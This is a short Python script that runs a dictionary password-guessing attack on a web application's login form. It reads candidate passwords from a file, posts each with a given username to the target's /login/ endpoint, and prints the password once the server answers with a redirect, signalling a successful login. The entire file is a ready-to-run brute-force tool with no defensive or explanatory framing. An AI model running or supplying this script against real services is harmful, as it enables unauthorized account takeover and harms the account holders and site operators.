import argparse, requests

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--endpoint")
parser.add_argument("-u", "--username")
args=parser.parse_args()
username=args.username
url = args.endpoint
with open("passwords.txt", "r") as f:
    for line in f:
        res=requests.post(url+"/login/", data={"username": username, "password": line.strip("\n")}, allow_redirects=False)
        if res.is_redirect:
            print(line)
            break

